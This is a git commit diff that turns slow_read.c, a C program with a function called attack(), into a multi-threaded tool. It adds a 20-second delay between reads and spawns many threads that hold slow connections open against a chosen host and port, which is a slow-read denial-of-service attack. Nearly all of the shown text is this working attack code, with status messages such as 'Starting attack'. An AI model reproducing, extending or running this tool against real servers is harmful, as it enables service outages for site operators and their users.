2181808c178be9bf488922e3ed61936283d79e3e
Keith Mendoza <keith@homepluspower.info>
2016-11-13 08:36:30 -0800

    Multi-threaded

--- slow_read.c
+++ slow_read.c
@@ -2,6 +2,7 @@
 #include <stdlib.h>
 #include <unistd.h>
 #include <string.h>
+
 #include <sys/types.h>
 #include <sys/socket.h>
 #include <netinet/in.h>
@@ -10,6 +11,13 @@
 
 #include <getopt.h>
 
+#include <pthread.h>
+
+struct worker_params
+{
+    const char *host;
+    int port;
+};
 
 const int error(const char *msg)
 {
@@ -61,6 +69,7 @@ const int attack(const char *dest, const int portno)
         {
             buffer[buffer_size] = '\0';
             printf("%s\n",buffer);
+            sleep(20);
         }
         else
             printf("No more data to read\n");
@@ -70,12 +79,36 @@ const int attack(const char *dest, const int portno)
     return EXIT_SUCCESS;
 }
 
+void *worker(void *t)
+{
+    struct worker_params *params = (struct worker_params *)t;
+    int *retVal;
+
+    retVal = (int *)malloc(sizeof(int));
+    if(!retVal)
+    {
+        fprintf(stderr, "Failed to allocate memory for return value. Not starting attacker\n");
+        pthread_exit(NULL);
+    }
+
+    int tmp = attack(params->host, params->port);
+    memcpy(retVal, &tmp, sizeof(int));
+    pthread_exit(retVal);
+}
+
 int main(int argc, char **argv)
 {
     int numThreads;
     int ch;
+    int retVal;
     char host[256];
     int port;
+    int i;
+    struct worker_params *params;
+    int status;
+
+    pthread_attr_t attr;
+    pthread_t *threads;
     
     numThreads = 1;
     host[0] = 0;
@@ -110,7 +143,55 @@ int main(int argc, char **argv)
         }
     }
 
-    attack(host, port);
+    params = (struct worker_params *)malloc(sizeof(struct worker_params));
+    if(!params)
+        error("Failed to allocate memory for worker parameter");
+    params->host = host;
+    params->port = (const int)port;
 
+    retVal = pthread_attr_init(&attr);
+    if(retVal)
+    {
+        fprintf(stderr, "Failed to initialize thread attributes. Code: %d", retVal);
+        return EXIT_FAILURE;
+    }
+    retVal = pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE);
+    if(retVal)
+    {
+        fprintf(stderr, "Failed to intialize thread attributes. Code: %d", retVal);
+        return EXIT_FAILURE;
+    }
+    printf("Thread attributes initialized");
+
+    threads = malloc(numThreads * sizeof(pthread_t));
+    if(!threads)
+        error("Failed to initialize pthread_t memory");
+    printf("pthread memory initialized");
+    printf("Starting attack");
+
+    for(i=0; i<numThreads; i++)
+    {
+        retVal = pthread_create(&threads[i], &attr, worker, (void *)params);
+        if(retVal)
+        {
+            fprintf(stderr, "Faieled to initialize attacker thread. Code: %d\n", retVal);
+            return EXIT_FAILURE;
+        }
+    }
+
+    printf("Wait for attackers\n");
+    for(i=0; i<numThreads; i++)
+    {
+        retVal = pthread_join(threads[i], (void *)&status);
+        if(retVal)
+            printf("Failed to join thread %d. Code: %d\n", i, retVal);
+        else
+        {
+            printf("Thread %d completed with code %d\n", i, status);
+            free(&status);
+        }
+    }
+
+    printf("Attack complete\n");
     return 0;
 }
